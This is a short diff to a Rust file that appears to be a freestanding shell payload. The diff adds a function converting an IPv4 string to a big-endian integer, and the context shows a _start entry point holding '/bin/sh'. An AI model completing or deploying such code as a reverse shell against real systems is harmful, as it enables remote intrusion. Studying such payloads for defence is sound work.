@@ -132,7 +132,18 @@ pub unsafe fn exit(ret: usize) -> ! {
     res.to_be()
     )
 }
-
+pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
+    let ip_it = ipv4_str.split('.');
+    let mut r = [0u8; 4];
+    for (idx, b) in ip_it.enumerate() {
+        r[idx] = b.parse::<u8>().unwrap()
+    }
+    let mut res = (r[0] as u32) << 24;
+    res |= (r[1] as u32) << 16;
+    res |= (r[2] as u32) << 8;
+    res |= r[3] as u32;
+    res.to_be()
+}
 #[no_mangle]
 fn _start() -> ! {
     let shell: &str = "/bin/sh\x00";
